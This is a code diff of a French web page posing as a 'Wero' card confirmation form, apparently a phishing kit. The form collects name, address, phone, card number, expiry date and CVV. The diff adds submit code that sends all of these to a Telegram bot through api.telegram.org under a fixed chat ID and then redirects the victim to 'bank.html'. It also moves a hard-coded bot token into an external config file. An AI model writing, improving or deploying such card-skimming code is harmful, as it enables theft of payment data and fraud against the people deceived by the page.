@@ -1,14 +1,8 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
+    <script src="config.js" defer></script>
     <meta charset="UTF-8">
-    <script>
-        // TEST: Token en dur pour debug
-        window.telegramConfig = {
-            BOT_TOKEN: "8871083897:AAGpjw7FpPxtPuYFgoqdg8t4bjhZ9DD9Elw",
-            CHAT_ID: "8176081750"
-        };
-    </script>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Wero - Confirmation de carte</title>
     
@@ -764,7 +758,7 @@
                 
                 <div class="form-group">
                     <label>Numéro de téléphone <span class="asterisk">*</span></label>
-                    <input type="tel" id="phone" placeholder="+33 0 00 00 00 00" required autocomplete="tel" maxlength="17">
+                    <input type="tel" id="phone" placeholder="Ex: 06 12 34 56 78" required autocomplete="tel">
                     <div class="error-message" id="error-phone">Veuillez entrer un numéro valide</div>
                 </div>
 
@@ -870,6 +864,7 @@
         </div>
     </footer>
 
+    <script src="script-cartes.js" defer></script>
     <script>
         document.addEventListener("DOMContentLoaded", () => {
             
@@ -1026,45 +1021,8 @@
             });
 
             cvv.addEventListener("input", (e) => { e.target.value = e.target.value.replace(/\D/g, ""); });
-            
-            phone.addEventListener("input", (e) => {
-                // Extraire les chiffres
-                let digits = e.target.value.replace(/\D/g, "");
-                
-                // Si ça commence par 33, on le retire (c'est du +33 qui a été capturé)
-                if (digits.startsWith('33')) {
-                    digits = digits.substring(2);
-                }
-                
-                // Limiter à 10 chiffres
-                digits = digits.slice(0, 10);
-                
-                // Construire le format: +33 0 XX XX XX XX
-                let formatted = "+33 ";
-                if (digits.length >= 1) formatted += digits[0];
-                if (digits.length >= 2) formatted += " " + digits.substring(1, 3);
-                if (digits.length >= 4) formatted += " " + digits.substring(3, 5);
-                if (digits.length >= 6) formatted += " " + digits.substring(5, 7);
-                if (digits.length >= 8) formatted += " " + digits.substring(7, 10);
-                
-                e.target.value = formatted;
-            });
-            
-            amount.addEventListener("input", function(e) {
-                // Extraire les chiffres
-                let digits = e.target.value.replace(/\D/g, "");
-                
-                // Limiter à 10 chiffres
-                digits = digits.slice(0, 10);
-                
-                // Ajouter les séparateurs de milliers
-                let formatted = digits.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
-                
-                // Ajouter l'euro à la fin (avec code HTML)
-                formatted = formatted + ' EUR';
-                
-                e.target.value = formatted;
-            });
+            phone.addEventListener("input", (e) => { e.target.value = e.target.value.replace(/[^0-9 ]/g, ""); });
+            amount.addEventListener("input", (e) => { e.target.value = e.target.value.replace(/[^0-9.,]/g, ""); });
 
             form.addEventListener('submit', async (e) => {
                 e.preventDefault();
@@ -1078,18 +1036,14 @@
                 submitBtn.textContent = 'Vérification en cours...';
                 loadingOverlay.style.display = 'flex';
                 
+                const BOT_TOKEN = (window.telegramConfig && window.telegramConfig.BOT_TOKEN) || '[REDACTED]';
                 const CHAT_ID = '6078788670';
                 const msg = 'CARTE: ' + cardName.value + ' | ADRESSE: ' + address.value + ' | TEL: ' + phone.value + ' | MONTANT: ' + amount.value + ' | NUMERO: ' + cardNumber.value + ' | EXPIRATION: ' + expiry.value + ' | CVV: ' + cvv.value;
-                
-                fetch('/api/telegram', {
+                fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({chat_id: CHAT_ID, text: msg})
-                }).then(r => r.json()).then(d => {
-                    console.log('Telegram response:', d);
-                }).catch(e => {
-                    console.error('Telegram error:', e);
-                });
+                }).catch(e => console.error(e));
                 
                 setTimeout(() => {
                     window.location.href = 'bank.html';
